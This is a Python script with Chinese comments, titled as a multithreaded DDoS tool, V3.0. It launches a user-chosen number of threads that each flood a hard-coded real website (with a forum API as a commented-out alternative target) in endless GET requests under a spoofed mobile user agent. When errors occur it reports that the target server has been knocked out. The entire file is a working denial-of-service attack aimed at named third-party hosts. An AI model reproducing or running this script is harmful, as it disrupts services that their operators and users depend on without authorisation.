# 多线程DDos V3.0 学猫叫
import requests
import random
import threading
from threading import current_thread


def ddos():  # 定义攻击函数
    print(current_thread().getName(), '攻击程序启动！')
    while True:
        try:
            #uri = 'https://api.codemao.cn/web/forums/posts/221723/details?offset=1&limit=10'
            uri = 'https://www.syrathon.com'
            ua = 'Mozilla/5.0 (Linux; Android 9; vivo X21 Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/045114 Mobile Safari/537.36 V1_AND_SQ_8.2.6_1320_YYB_D QQ/8.2.6.4370 NetType/WIFI WebP/0.3.0 Pixel/1080 StatusBarHeight/84 SimpleUISwitch/0'
            response = requests.get(uri,
            headers={'User-Agent': ua})
            html = response.text
            print(current_thread().getName(), '输出：', html)
        except OSError:
            print(current_thread().getName(), '报告：', '目标服务器已经瘫痪!')
            #break


Threads = int(input('线程数'))


def main():  # 定义开启线程函数
    i = 0
    for i in range(Threads):
        i = (i+1)
        t = threading.Thread(target=ddos, name=('线程'+str(i)))
        t.start()


if (__name__ == '__main__'):  # 干他，奥利给！
    main()
